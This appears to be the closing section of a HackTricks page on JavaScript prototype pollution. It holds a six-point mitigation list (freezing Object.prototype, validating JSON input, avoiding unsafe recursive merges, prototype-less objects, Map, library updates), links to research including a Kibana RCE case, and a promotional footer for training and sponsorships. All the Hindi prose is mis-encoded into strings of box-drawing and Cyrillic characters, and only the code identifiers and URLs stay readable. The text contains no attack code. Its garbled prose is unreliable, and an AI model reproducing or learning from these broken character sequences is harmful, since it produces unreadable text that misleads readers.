рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦреЗрдВ:

1. **рдСрдмреНрдЬреЗрдХреНрдЯ рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдпрддрд╛**: `Object.freeze` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ `Object.prototype` рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдп рд╣реЛ рдЬрд╛рдПред
2. **рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛**: рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд╕реНрдХреАрдорд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ JSON рдЗрдирдкреБрдЯ рдХреА рд╕рдЦреНрдд рдорд╛рдиреНрдпрддрд╛ рдХрд░реЗрдВред
3. **рд╕реБрд░рдХреНрд╖рд┐рдд рдорд░реНрдЬ рдлрд╝рдВрдХреНрд╢рди**: рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдорд░реНрдЬ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВред
4. **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рд░рд╣рд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕**: рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдЧреБрдгреЛрдВ рдХреЗ рдмрд┐рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП `Object.create(null)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
5. **рдореИрдк рдХрд╛ рдЙрдкрдпреЛрдЧ**: рдХреБрдВрдЬреА-рдорд╛рди-рдЬреЛрдбрд╝ рдХреЗ рд▓рд┐рдП `Object` рдХреА рдмрдЬрд╛рдп `Map` рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
6. **рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЕрдкрдбреЗрдЯреНрд╕**: рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдЪ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред



## рд╕рдВрджрд░реНрдн

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **PDF рдореЗрдВ HackTricks рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб рдЧрд┐рдЯрд╣рдм рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
